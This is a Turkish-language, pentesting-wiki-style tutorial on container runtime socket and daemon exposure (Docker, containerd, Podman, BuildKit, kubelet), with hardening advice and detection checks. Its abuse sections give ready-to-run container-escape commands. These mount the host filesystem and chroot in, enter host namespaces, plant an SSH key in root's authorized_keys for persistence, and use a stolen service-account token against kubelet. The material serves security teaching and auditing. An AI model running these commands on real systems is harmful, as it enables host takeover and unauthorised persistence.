# Runtime API ve Daemon'a Maruz Kalma

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Gerçek dünyadaki birçok container ihlali, bir namespace escape ile başlamaz. Runtime control plane'e erişimle başlar. Bir workload, bağlanmış bir Unix socket veya dışarıya açık bir TCP listener üzerinden `dockerd`, `containerd`, CRI-O, Podman ya da kubelet ile iletişim kurabiliyorsa saldırgan daha iyi ayrıcalıklara sahip yeni bir container oluşturabilir, host dosya sistemini bağlayabilir, host namespace'lerine katılabilir veya hassas node bilgilerini alabilir. Böyle durumlarda gerçek güvenlik sınırı runtime API'dir ve bu API'nin ele geçirilmesi, işlevsel olarak host'un ele geçirilmesine yakındır.

Runtime socket'lerinin dışarıya açık olması bu yüzden kernel korumalarından ayrı belgelenmelidir. Sıradan seccomp, capabilities ve MAC kısıtlamalarına sahip bir container bile, içine `/var/run/docker.sock` veya `/run/containerd/containerd.sock` bağlanmışsa host'un ele geçirilmesine tek bir API çağrısı kadar uzakta olabilir. Mevcut container'ın kernel izolasyonu tasarlandığı gibi çalışıyor olabilir; ancak runtime yönetim düzlemi tamamen dışarıya açık kalabilir.

## Daemon Erişim Modelleri

Docker Engine, ayrıcalıklı API'sini geleneksel olarak `unix:///var/run/docker.sock` adresindeki yerel Unix socket üzerinden sunar. Geçmişte, `tcp://0.0.0.0:2375` gibi TCP listener'ları veya TLS korumalı `2376` listener'ı üzerinden uzaktan da erişime açılmıştır. Daemon'ı güçlü TLS ve istemci kimlik doğrulaması olmadan uzaktan erişime açmak, Docker API'sini fiilen uzaktan root arayüzüne dönüştürür.

containerd, CRI-O, Podman ve kubelet de benzer yüksek etkili yüzeylere sahiptir. İsimleri ve iş akışları farklıdır, ancak mantık aynıdır. Arayüz, çağıranın workload oluşturmasına, host yollarını bağlamasına, kimlik bilgilerini almasına veya çalışan container'ları değiştirmesine izin veriyorsa ayrıcalıklı bir yönetim kanalıdır ve buna göre ele alınmalıdır.

Bir container yönetim web arayüzü, yerel hesaba doğrudan socket erişimi vermeden de aynı sınırı açığa çıkarabilir. Örneğin, [Portainer issue #493](https://github.com/portainer/portainer/issues/493), eski bir 1.11.1 sürümünde kimlik doğrulaması olmadan yönetici parolası sıfırlama sorununu belgelemiştir. Yerel olarak erişilebilen bir arayüzü yalnızca inceleme için bir ipucu olarak değerlendirin: kurulu sürümü ve kimlik doğrulama davranışını, yönetici üzerindeki gerçek kontrolü ve yönetilen endpoint'in yazılabilir bir host bind mount ile container oluşturup oluşturamadığını doğrulayın. [Portainer belgeleri](https://docs.portainer.io/admin/environments/add/docker/socket), socket tabanlı yönetimin Docker socket'ine erişim gerektirdiğini belirtir; rootless veya kısıtlı bir endpoint, host üzerindeki etkiyi değiştirir. Yalnızca bir işlem adına, porta veya sürüm dizgesine bakarak kimlik doğrulama açığı ya da host-root erişimi olduğu sonucuna varmayın.

Kontrol etmeye değer yaygın yerel yollar:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Daha eski veya daha özelleşmiş yığınlar `dockershim.sock`, `frakti.sock` ya da `rktlet.sock` gibi uç noktaları da açığa çıkarabilir. Bunlar modern ortamlarda daha az yaygındır; ancak karşılaşıldıklarında sıradan uygulama soketleri değil, runtime denetim yüzeyleri oldukları için aynı dikkatle ele alınmalıdır.

## Güvenli Uzaktan Erişim

Bir daemon yerel soketin ötesinde erişime açılmak zorundaysa bağlantı TLS ile korunmalı ve tercihen karşılıklı kimlik doğrulaması kullanılmalıdır; böylece daemon istemciyi, istemci de daemon’ı doğrular. Kolaylık uğruna Docker daemon’ını düz HTTP üzerinden açma şeklindeki eski alışkanlık, container yönetimindeki en tehlikeli hatalardan biridir; çünkü API yüzeyi doğrudan ayrıcalıklı container’lar oluşturabilecek kadar güçlüdür.

Geçmişte kullanılan Docker yapılandırma kalıbı şöyleydi:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

systemd tabanlı hostlarda daemon iletişimi `fd://` olarak da görünebilir; bu, sürecin soketi doğrudan kendisinin bağlamak yerine systemd tarafından önceden açılmış bir soketi devraldığı anlamına gelir. Önemli olan tam sözdizimi değil, bunun güvenlik açısından doğurduğu sonuçtur. Daemon, sıkı izinlere sahip yerel bir soketin ötesinde bir noktada dinlemeye başladığı anda, aktarım güvenliği ve istemci kimlik doğrulaması isteğe bağlı sıkılaştırma önlemleri olmaktan çıkar ve zorunlu hâle gelir.

## Kötüye Kullanım

Bir runtime socket varsa hangisi olduğunu, uyumlu bir client bulunup bulunmadığını ve ham HTTP veya gRPC erişiminin mümkün olup olmadığını doğrulayın:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Bu komutlar; erişilemeyen bir yol, bağlanmış ancak erişilemeyen bir socket ve çalışan, ayrıcalıklı bir API arasındaki farkı anlamaya yardımcı olur. İstemci başarılı olursa sıradaki soru, API'nin host bind mount veya host namespace paylaşımıyla yeni bir container başlatıp başlatamayacağıdır.

### İstemci Yüklü Değilse

`docker`, `podman` veya başka bir kullanıcı dostu CLI'nin bulunmaması, socket'in güvenli olduğu anlamına gelmez. Docker Engine, Unix socket'i üzerinden HTTP konuşur ve Podman, `podman system service` aracılığıyla hem Docker uyumlu bir API hem de Libpod'a özgü bir API sunar. Bu da yalnızca `curl` bulunan minimal bir ortamın bile daemon'ı yönetmek için yeterli olabileceği anlamına gelir:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

PHP kod yürütmesi `open_basedir` ile kısıtlandığında, PHP sürecinin bağlanmak için işletim sistemi düzeyinde izni varsa [Unix socket bağlantıları ayrı bir yol olarak kullanılabilir](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir).

Bu, post-exploitation sırasında önemlidir; çünkü savunmacılar bazen yaygın istemci ikili dosyalarını kaldırırken yönetim socket’ini mount edilmiş halde bırakır. Podman host’larında, yüksek değerli yolun rootful ve rootless dağıtımlarda farklı olduğunu unutmayın: rootful servis örnekleri için `unix:///run/podman/podman.sock`, rootless olanlar içinse `unix://$XDG_RUNTIME_DIR/podman/podman.sock`.

### Tam Örnek: Docker Socket’inden Host Root’a

`docker.sock` erişilebilirse, klasik kaçış yöntemi host’un kök dosya sistemini mount eden yeni bir container başlatıp ardından içine `chroot` yapmaktır:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Bu, Docker daemon üzerinden doğrudan host-root düzeyinde kod yürütme olanağı sağlar. Etki yalnızca dosyaları okumakla sınırlı değildir. Yeni container’ın içine girdikten sonra saldırgan host dosyalarını değiştirebilir, kimlik bilgilerini toplayabilir, kalıcılık sağlayabilir veya ek ayrıcalıklı iş yükleri başlatabilir.

### Tam Örnek: Docker Socket’inden Host Namespace’lerine

Saldırgan yalnızca dosya sistemi erişimi yerine namespace’lere girmeyi tercih ederse:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Bu yol, mevcut container'dan yararlanmak yerine runtime'dan açıkça host namespace'lerine erişimi olan yeni bir container oluşturmasını isteyerek host'a ulaşır.

### Docker Socket Kalıcılık Deseni

Runtime kontrolü, tek seferlik bir shell yerine kalıcılık sağlamak için de kullanılabilir. Genel yöntem; host mount'u olan bir yardımcı container oluşturmak, mount edilen host dosya sistemine yetkili erişim bilgileri veya bir başlangıç hook'u yazmak ve ardından host'un bunları kullandığını doğrulamaktır.

Örnek biçim:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Aynı fikir, operatörün neyi kanıtlamak istediğine bağlı olarak systemd unit'lerini, cron parçalarını, uygulama başlangıç dosyalarını veya SSH anahtarlarını hedefleyebilir. Önemli nokta, kalıcı değişikliğin özgün container'da ek yetki kullanılarak değil, runtime daemon'ın host düzeyindeki dosya sistemi yetkisi aracılığıyla yapılmasıdır.

### Raw Docker API Helper Pivot

Docker CLI mevcut olmadığında, aynı host-mount helper akışı Unix socket üzerinden HTTP ile yürütülebilir. Genel akış şöyledir: API'yi doğrulayın, host bind mount kullanan bir helper container oluşturun, başlatın, bir exec instance oluşturun ve bu exec'i başlatın.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Son `/exec/<id>/start` isteği döndürülen exec ID'ye bağlıdır, ancak güvenlik açısından önemli nokta tam JSON yapısından bağımsızdır: rootful Docker daemon'a ham API erişimi, daha güçlü bir yardımcı iş yükü talep etmek için yeterlidir.

### Tam Örnek: containerd Socket

Bağlanan bir `containerd` socket'i genellikle aynı derecede tehlikelidir:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Daha Docker benzeri bir istemci varsa `nerdctl`, `--privileged`, `--pid=host` ve `-v` gibi tanıdık flag'leri sunduğu için `ctr`'den daha kullanışlı olabilir:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Etki yine host'un ele geçirilmesidir. Docker'a özgü araçlar bulunmasa bile başka bir runtime API aynı yönetim gücünü sunabilir. Kubernetes düğümlerinde `crictl`, CRI endpoint'iyle doğrudan konuştuğu için keşif ve container etkileşimi için de yeterli olabilir.

### BuildKit Socket

İnsanlar `buildkitd`'yi genellikle "yalnızca build backend'i" olarak gördüğünden gözden kaçırmak kolaydır; ancak daemon hâlâ ayrıcalıklı bir kontrol düzlemidir. Erişilebilir bir `buildkitd.sock`, saldırganın rastgele build adımları çalıştırmasına, worker yeteneklerini incelemesine, ele geçirilmiş ortamdan yerel context'leri kullanmasına ve daemon bunlara izin verecek şekilde yapılandırılmışsa `network.host` veya `security.insecure` gibi tehlikeli yetkiler istemesine olanak tanıyabilir.

İlk olarak yapılabilecek yararlı etkileşimler şunlardır:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Daemon build isteklerini kabul ediyorsa, güvensiz entitlements seçeneklerinin kullanılabilir olup olmadığını test edin:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Kesin etki daemon yapılandırmasına bağlıdır; ancak izin verici entitlements ayarlarına sahip rootful BuildKit hizmeti zararsız bir geliştirici kolaylığı değildir. Özellikle CI runner’larında ve paylaşılan build node’larında bunu yüksek değerli başka bir yönetim yüzeyi olarak değerlendirin.

### Kubelet API Üzerinden TCP

kubelet bir container runtime değildir; ancak yine de node yönetim düzleminin bir parçasıdır ve genellikle aynı güven sınırı tartışmalarında yer alır. kubelet’in güvenli portu `10250` iş yükünden erişilebiliyorsa veya node kimlik bilgileri, kubeconfig dosyaları ya da proxy hakları açığa çıkmışsa saldırgan, Kubernetes API sunucusunun admission yoluna hiç dokunmadan Pod’ları listeleyebilir, log’ları alabilir veya node üzerindeki container’larda komut çalıştırabilir.

Önce kolay keşif adımlarıyla başlayın:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Kubelet veya API-server proxy yolu `exec` yetkisi veriyorsa, WebSocket destekli bir istemci bunu kullanarak node üzerindeki diğer container’larda kod çalıştırabilir. `nodes/proxy` için yalnızca `get` izninin kulağa geldiğinden daha tehlikeli olmasının nedeni de budur: İstek yine de komut çalıştıran kubelet endpoint’lerine ulaşabilir ve kubelet ile doğrudan kurulan bu etkileşimler normal Kubernetes audit log’larında görünmez.<sup>[[2]](#references)</sup>

## Kontroller

Bu kontrollerin amacı, container’ın güven sınırının dışında kalması gereken herhangi bir yönetim düzlemine erişip erişemediğini belirlemektir.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Burada dikkat çekici olanlar:

- Bağlanmış bir runtime socket'i genellikle yalnızca bilgi ifşası değil, doğrudan yönetim yetkisi sağlar.
- TLS olmadan `2375` portunda dinleyen bir TCP listener, uzaktan ele geçirilme durumu olarak değerlendirilmelidir.
- `DOCKER_HOST` gibi ortam değişkenleri, workload'un host runtime ile konuşacak şekilde tasarlandığını çoğu zaman ortaya çıkarır.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak yerel Unix socket | `dockerd` yerel socket üzerinde dinler ve daemon genellikle root yetkileriyle çalışır | `/var/run/docker.sock` bağlamak, `tcp://...:2375` adresini dışarı açmak, `2376` üzerinde zayıf veya eksik TLS kullanmak |
| Podman | Varsayılan olarak daemonless CLI | Olağan yerel kullanım için uzun süre çalışan ayrıcalıklı bir daemon gerekmez; `podman system service` etkinleştirildiğinde API socket'leri yine de dışarı açılabilir | `podman.sock` dışarı açmak, servisi geniş erişime açmak, root yetkileriyle API kullanmak |
| containerd | Yerel ayrıcalıklı socket | Yönetim API'si yerel socket üzerinden dışarı açılır ve genellikle üst düzey araçlar tarafından kullanılır | `containerd.sock` bağlamak, geniş `ctr` veya `nerdctl` erişimi vermek, ayrıcalıklı namespace'leri dışarı açmak |
| CRI-O | Yerel ayrıcalıklı socket | CRI endpoint'i, düğümdeki güvenilir bileşenler tarafından kullanılmak üzere tasarlanmıştır | `crio.sock` bağlamak, CRI endpoint'ini güvenilmeyen workload'lara açmak |
| Kubernetes kubelet | Düğümdeki yönetim API'si | Kubelet, Pod'lar tarafından geniş çapta erişilebilir olmamalıdır; kimlik doğrulama/yetkilendirme ayarlarına bağlı olarak erişim Pod durumunu, kimlik bilgilerini ve çalıştırma özelliklerini açığa çıkarabilir | kubelet socket'lerini veya sertifikalarını bağlamak, kubelet kimlik doğrulamasını zayıflatmak, host networking ile erişilebilir kubelet endpoint'ini bir arada kullanmak |



## References

- [1] [containerd socket istismarının 1. bölümü](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Riskleri](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
